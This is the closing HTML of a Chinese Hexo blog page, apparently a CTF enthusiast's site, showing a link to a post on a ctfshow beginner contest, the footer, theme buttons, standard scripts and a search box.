href="/2025/03/18/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" title="ctfshow萌新赛"><img src="/image/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow萌新赛"/></a><div class="content"><a class="title" href="/2025/03/18/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" title="ctfshow萌新赛">ctfshow萌新赛</a><time datetime="2025-03-18T06:31:48.000Z" title="发表于 2025-03-18 14:31:48">2025-03-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/image/3.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By wanTh3flag</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
